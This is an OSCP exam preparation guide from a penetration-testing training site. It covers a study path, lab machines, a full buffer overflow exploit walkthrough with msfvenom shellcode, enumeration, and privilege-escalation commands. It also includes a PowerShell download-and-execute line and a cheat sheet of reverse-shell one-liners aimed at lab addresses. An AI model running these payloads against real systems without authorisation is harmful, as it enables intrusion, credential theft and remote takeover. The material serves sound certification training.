---
layout: training-page
title: "OSCP Preparation Guide — Red Team Academy"
module: "Fundamentals"
tags:
  - oscp
  - certification
  - preparation
  - pwk
  - buffer-overflow
page_key: "fundamentals-oscp-prep"
render_with_liquid: false
---

# OSCP Preparation Guide

The Offensive Security Certified Professional (OSCP) is the industry standard hands-on penetration testing certification. The 24-hour exam requires compromising a set of machines and submitting a professional report. This guide covers the preparation path, key techniques, and curated resources.

## Exam Overview

```
Exam:        OSCP (OffSec PEN-200 / PWK)
Format:      24-hour hands-on + 24-hour report submission
Machines:    Multiple targets (standalone + Active Directory set)
Tools:       Metasploit allowed (limited to 1 machine for most modules)
Motto:       "Try Harder"
Key skills:  Enumeration, manual exploitation, privesc, buffer overflow
```

## Preparation Path

### Phase 1 — Foundations (1–2 months)

```
# Linux command line mastery
OverTheWire: Bandit (levels 0–34)
ssh bandit0@bandit.labs.overthewire.org -p 2220

# Networking fundamentals
- TCP/IP, subnetting, ports and services
- Wireshark — read pcap files, identify protocols
- Nmap — master all scan types

# Scripting basics
- Python: socket programming, basic exploit scripts
- Bash: automation, one-liners for enumeration
```

### Phase 2 — Core Techniques (2–3 months)

```
# Web application hacking
TryHackMe rooms:
  - OWASP Top 10
  - SQL Injection
  - Burp Suite basics

# Password attacks
TryHackMe rooms:
  - Crack The Hash
  - Hydra

# Active Directory basics
- Kerberoasting, AS-REP Roasting
- Pass-the-Hash, Pass-the-Ticket
```

### Phase 3 — Vulnerable Machines (2–3 months)

```
# VulnHub machines (Easy — boot2root practice)
Brainpan      # Buffer overflow practice
Kioptrix2014  # Web + privesc
LazySysAdmin  # Enumeration basics
MrRobot       # CTF-style
Pwnlab_init   # File inclusion + privesc

# Hack The Box (Easy/Medium — OSCP-like)
Blue          # EternalBlue MS17-010 (Windows)
Devel         # FTP + web + privesc
Bastard       # Drupal RCE
Cronos        # DNS zone transfer + SQL + cron privesc
Active        # Active Directory + Kerberoasting
Bounty        # IIS + juicy potato
Silo          # Oracle + OSCE
Conceal       # SNMP + IPSec + IIS upload
```

### Phase 4 — Buffer Overflows (2–4 weeks)

```
# Stack-based buffer overflow on Windows (x86)
# Tools needed: Immunity Debugger + mona.py + vulnerable app

# Target applications for practice
VulnServer    # Multiple buffer overflow exercises (TRUN, GMON, etc.)
SLMail        # Classic OSCP-style BoF target
Brainpan      # Linux BoF (ELF binary)
DoStackBufferOverflowGood  # Beginner-friendly

# Standard BoF methodology
1. Fuzz the application — find crash point
2. Control EIP — find exact offset with pattern
3. Bad character identification
4. Find JMP ESP — return to shellcode
5. Generate shellcode with msfvenom
6. Deliver exploit
```

## Buffer Overflow — Step by Step

```
# Step 1: Fuzz — find crash point
python3 -c "print('A' * 3000)" | nc 10.10.10.5 9999

# Step 2: Generate cyclic pattern (find exact offset)
msf-pattern_create -l 3000
# Send pattern, note EIP value after crash
msf-pattern_offset -l 3000 -q 6f43396e   # Returns: offset=2003

# Step 3: Control EIP
python3 -c "print('A'*2003 + 'B'*4 + 'C'*500)" | nc 10.10.10.5 9999
# Verify EIP = 42424242 (BBBB)

# Step 4: Find bad characters
# Send \x01 through \xff in payload, compare with memory dump
# Common bad chars: \x00 (null), \x0a (newline), \x0d (carriage return)

# Step 5: Find JMP ESP (no ASLR/NX on OSCP targets)
# In Immunity Debugger with mona.py:
!mona modules                              # Find modules without protections
!mona find -s "\xff\xe4" -m vulnapp.exe   # Find JMP ESP addresses

# Step 6: Generate shellcode
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 \
  -f py -b "\x00\x0a\x0d" EXITFUNC=thread

# Step 7: Build final exploit
payload = b"\x90" * 16      # NOP sled
payload += shellcode         # Generated shellcode
exploit = b"A" * 2003 + b"\xaf\x11\x50\x62" + payload  # JMP ESP addr (little-endian)
s.send(exploit)
```

## Enumeration Methodology

```
# Phase 1: Host discovery
nmap -sn 10.10.10.0/24

# Phase 2: Port scan
nmap -sV -sC -p- --min-rate 5000 10.10.10.5 -oN scan.txt

# Phase 3: Service-specific enumeration
# Web (80/443)
gobuster dir -u http://10.10.10.5 -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,html,txt
nikto -h http://10.10.10.5

# SMB (445)
enum4linux -a 10.10.10.5
smbclient -L //10.10.10.5 -N
crackmapexec smb 10.10.10.5

# FTP (21)
ftp 10.10.10.5   # Try anonymous login
nmap -p21 --script ftp-anon 10.10.10.5

# SMTP (25)
nc 10.10.10.5 25
VRFY root
VRFY admin

# SNMP (161)
snmpwalk -c public -v2c 10.10.10.5
# May leak usernames, installed software, processes

# NFS (2049)
showmount -e 10.10.10.5
mount -t nfs 10.10.10.5:/share /mnt

# LDAP (389)
ldapsearch -x -H ldap://10.10.10.5 -b "dc=domain,dc=com"
```

## Linux Privilege Escalation

```
# Automated enumeration
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Manual checks
sudo -l                                   # Sudo permissions
find / -perm -u=s -type f 2>/dev/null     # SUID binaries
cat /etc/crontab                          # Cron jobs
ls -la /etc/cron*                         # All cron directories
cat /etc/passwd | grep -v nologin         # Users with shells
cat /etc/shadow 2>/dev/null               # Password hashes (if readable)
find / -name "*.conf" -readable 2>/dev/null  # Config files

# Kernel exploits
uname -a                                  # Kernel version
linux-exploit-suggester                   # Suggest kernel exploits
searchsploit "linux kernel 4.4"

# PATH hijacking
echo $PATH
find / -writable -type d 2>/dev/null      # Writable directories

# GTFOBINS — abuse allowed sudo binaries
# Example: if sudo -l shows /usr/bin/vim
sudo vim -c ':!/bin/sh'
```

## Windows Privilege Escalation

```
# Automated enumeration
.\winpeas.exe

# Manual checks
whoami /priv                              # Token privileges
systeminfo                                # OS version, patches
wmic service get name,startname          # Services and accounts
accesschk.exe -uwcqv "Authenticated Users" *  # Weak service permissions
schtasks /query /fo LIST /v               # Scheduled tasks
wmic product get name,version            # Installed software

# Unquoted service paths
wmic service get name,pathname | findstr /i /v "c:\\windows\\"

# AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Stored credentials
cmdkey /list
reg query HKLM /f password /t REG_SZ /s
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s

# Windows exploit suggester
systeminfo > sysinfo.txt
python windows-exploit-suggester.py --database 2021-09-21-mssb.xls --systeminfo sysinfo.txt
```

## File Transfer Techniques

```
# Linux → target
python3 -m http.server 8080             # Start HTTP server on attack machine

# On target — download file
wget http://10.10.14.5:8080/file.sh
curl http://10.10.14.5:8080/file.sh -o file.sh

# Windows — download and execute PowerShell
powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/Invoke-PowerShellTcp.ps1')"
certutil.exe -urlcache -f http://10.10.14.5:8080/nc.exe nc.exe

# Netcat file transfer
# Receiver:
nc -lvp 9001 > received_file
# Sender:
nc 10.10.14.5 9001 < file_to_send
```

## Recommended Lab Mockups

```
# Mockup 1 — Basic exploitation
Brainpan   (VulnHub) — Buffer overflow
Kioptrix   (VulnHub) — Web + privesc
LordOfTheRoot (VulnHub) — Enumeration

# Mockup 2 — Windows exploitation
Blue (HTB)    — MS17-010 EternalBlue
Devel (HTB)   — FTP + aspx webshell
Bastard (HTB) — Drupal 7 RCE

# Mockup 3 — Mixed
MrRobot (VulnHub) — WordPress + custom privesc
LazySysAdmin (VulnHub) — SMB + sudo privesc
Metasploitable3 — Multiple services

# Mockup 4 — Advanced / AD
Active (HTB) — Active Directory, Kerberoasting
Cronos (HTB) — DNS zone transfer + SQL injection + cron
DevOops (HTB) — XXE + deserialization
```

## Reporting

```
# OSCP report requirements:
# - Detailed methodology for each compromised machine
# - Screenshots with timestamps
# - Command syntax and output
# - Remediation recommendations

# Use these templates:
# https://github.com/noraj/OSCP-Exam-Report-Template-Markdown
# https://github.com/whoisflynn/OSCP-Exam-Report-Template

# During the exam — document EVERYTHING
# - Nmap output
# - Exploitation steps with exact commands
# - Proof files (proof.txt / local.txt contents)
# - Screenshots of flags
```

## Key Cheatsheets

```
# Reverse shell one-liners
# Bash
bash -i >& /dev/tcp/10.10.14.5/4444 0>&1

# Python
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.10.14.5",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# PHP
php -r '$sock=fsockopen("10.10.14.5",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

# PowerShell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.10.14.5",4444)

# Upgrade to full TTY (Linux)
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Then: Ctrl+Z → stty raw -echo; fg → reset

# Listener
nc -lvnp 4444
```

## Resources

- OSCP Survival Guide — `github.com/wwong99/pentest-notes/blob/master/oscp_resources/OSCP-Survival-Guide.md`
- TJNull's OSCP Preparation Guide — `www.netsecfocus.com/oscp/2019/03/29/The_Journey_to_Try_Harder`
- Tib3rius Buffer Overflow Guide — `github.com/Tib3rius/Pentest-Cheatsheets/blob/master/exploits/buffer-overflows.rst`
- OSCP MarkDown Report Templates — `github.com/chvancooten/OSCP-MarkdownReportingTemplates`
- GTFOBins — `gtfobins.github.io`
- OSCP MindMap — `github.com/umuttosun/OSCP-MindMap`
- Buffer Overflow Labs — `github.com/CyberSecurityUP/Buffer-Overflow-Labs`
